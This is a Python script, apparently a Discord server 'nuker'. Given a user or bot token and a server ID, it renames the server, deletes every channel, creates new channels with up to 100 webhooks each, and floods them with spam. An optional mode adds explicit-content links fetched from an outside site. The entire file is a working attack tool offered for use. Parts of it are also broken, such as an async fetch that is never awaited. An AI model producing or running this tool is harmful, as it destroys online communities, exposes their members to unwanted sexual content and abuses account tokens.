import os
import random
import time
import asyncio
import aiohttp
from pystyle import Colors, Center, Colorate
import sys
import json

__author__ = 'saze#0001'

banner = Center.XCenter("""
      ███████╗ █████╗ ███████╗███████╗███╗   ██╗██╗██╗   ██╗███╗   ███╗
      ██╔════╝██╔══██╗╚══███╔╝██╔════╝████╗  ██║██║██║   ██║████╗ ████║
      ███████╗███████║  ███╔╝ █████╗  ██╔██╗ ██║██║██║   ██║██╔████╔██║
      ╚════██║██╔══██║ ███╔╝  ██╔══╝  ██║╚██╗██║██║██║   ██║██║╚██╔╝██║
      ███████║██║  ██║███████╗███████╗██║ ╚████║██║╚██████╔╝██║ ╚═╝ ██║
      ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═══╝╚═╝ ╚═════╝ ╚═╝     ╚═╝
                              Created by saze#0001
""")

print(Colorate.Vertical(Colors.cyan_to_blue, banner, 2)) # print the banner

class main: # main class

    def __init__(self) -> None: # init function cause cool

        with open('config.json', 'r') as f:
            config = json.load(f)
            self.TOKEN = config["TOKEN"]
            self.MESSAGE = config["MESSAGE"]
            self.AMMOUNT_OF_CHANNELS = config["AMMOUNT_OF_CHANNELS"]
            self.SPAM_PRN = config["SPAM_PRN"]
            self.MESSAGES_PER_CHANNEL = config["MESSAGES_PER_CHANNEL"]
            self.SERVER_NAME = config["SERVER_NAME"]
            self.CHANNEL_NAMES = config["CHANNEL_NAMES"]
            self.REST_TIME = config["REST_TIME"]

        self.api = "https://discord.com/api/v9" 
        
        self.webhook_ammount = 100
        self.MESSAGES_PER_CHANNEL = round(self.MESSAGES_PER_CHANNEL / self.webhook_ammount)
        
        self.guild = input("Guild ID: ")
        if self.SPAM_PRN == True: # hehehehehehe
            self.hentai = self.get_hentai()
        
        asyncio.run(self.main()) # run main function
        
        
    async def main(self):
        type = input("Token, Bot/User:  ") # get token type
        if type == "user": # if user token
            self.nwords = {"Authorization": self.TOKEN} # make headers
        elif type == "bot": # if bot token
            self.nwords = {"Authorization": f"Bot {self.TOKEN}"} # make headers
        else:
            print("Invalid token type!")
            sys.exit()
        nwords = self.nwords # do that cause im lazy
        api = self.api # I hate using self all the time
        guild = self.guild
        if await self.check_admin() == False: # see if user is admin (buggy prolly)
            print("Administrator permissions required")
            time.sleep(5)
            sys.exit()
        async with aiohttp.ClientSession() as kdot: # make a session
            await kdot.patch(f'{api}/guilds/{guild}', headers=nwords, json={"name": self.SERVER_NAME}) # change server name
            async with kdot.get(f'{api}/guilds/{guild}/channels', headers=nwords) as r: # get all channels
                channel_id = await r.json() # get all channels
                for channels in channel_id: # loop through all channels
                    await kdot.delete(f'{api}/channels/{channels["id"]}', headers=nwords) # delete all channels


            for i in range(int(self.AMMOUNT_OF_CHANNELS)): # loop through all channels for the number chosen
                await asyncio.sleep(self.REST_TIME) # rest time so discord doesn't get on ur wewe
                async with kdot.post(f'{api}/guilds/{guild}/channels', headers=nwords, json={"name": str(self.CHANNEL_NAMES), "type": 0}) as r: # create channels
                    data = await r.json() 
                    try:
                        channelid = data['id']
                    except KeyError: # if discord ratelimits u
                        print('[-] Ratelimited')
                        break
                    
                for i in range(self.webhook_ammount): # loop through all webhooks
                    async with kdot.post(f'{api}/channels/{channelid}/webhooks', headers=nwords, json={"name": str(self.CHANNEL_NAMES)}) as r: # create webhooks
                        webhook_raw = await r.json() # get webhook
                        try:
                            hook = f'https://discord.com/api/webhooks/{webhook_raw["id"]}/{webhook_raw["token"]}' # webhook url
                        except KeyError:
                            print('Too many webhooks created') # if discord ratelimits u
                            break
                        if self.SPAM_PRN == True: #hehehehehehehehe
                            asyncio.create_task(self.spamhook_hentai(hook, self.MESSAGE))
                        else:
                            asyncio.create_task(self.spamhook(hook, self.MESSAGE))
                            
        while True: # this waits for all the async tasks to finish before exiting (makes sure there is only 1 left which is the main task)
            await asyncio.sleep(1)
            if len(asyncio.all_tasks()) == 1:
                break
        print("Finished")
        time.sleep(5)
        sys.exit()


    async def spamhook(self, hook, spam_message): # spam webhook function
        MESSAGES_PER_CHANNEL = int(self.MESSAGES_PER_CHANNEL)
        async with aiohttp.ClientSession() as kdot:
            for i in range(MESSAGES_PER_CHANNEL):
                await kdot.post(hook, json={'content': f"{spam_message}"})
                
    async def spamhook_hentai(self, hook, spam_message): # spam webhook function but wit hentai
        MESSAGES_PER_CHANNEL = int(self.MESSAGES_PER_CHANNEL)
        async with aiohttp.ClientSession() as kdot:
            for i in range(MESSAGES_PER_CHANNEL):
                random_hentai = random.choice(self.hentai)
                await kdot.post(hook, json={'content': f"{spam_message} {random_hentai}"})
                
    async def get_hentai(self): # get hentai from api
        url = 'https://sped.lol/api/random'
        async with aiohttp.ClientSession() as kdot:
            async with kdot.get(url) as r:
                data = await r.text()
                return data
            
    async def check_admin(self): # check if user is admin prolly works good
        async with aiohttp.ClientSession() as kdot: # ngl idk what I was doing here but it prolly works
            try:
                async with kdot.get(f"{self.api}/users/@me/guilds/{self.guild}/member", headers=self.nwords) as r:
                    self.admin_num = 1099511627775
                    data = await r.json()
                    if data["roles"] == self.admin_num or data["roles"] == []:
                        return True
                    else:
                        return False
            except:
                return True


if __name__ == '__main__': # pretty sure this isn't helping since there is no "main function" but idk it makes everything look nicer
    main() 
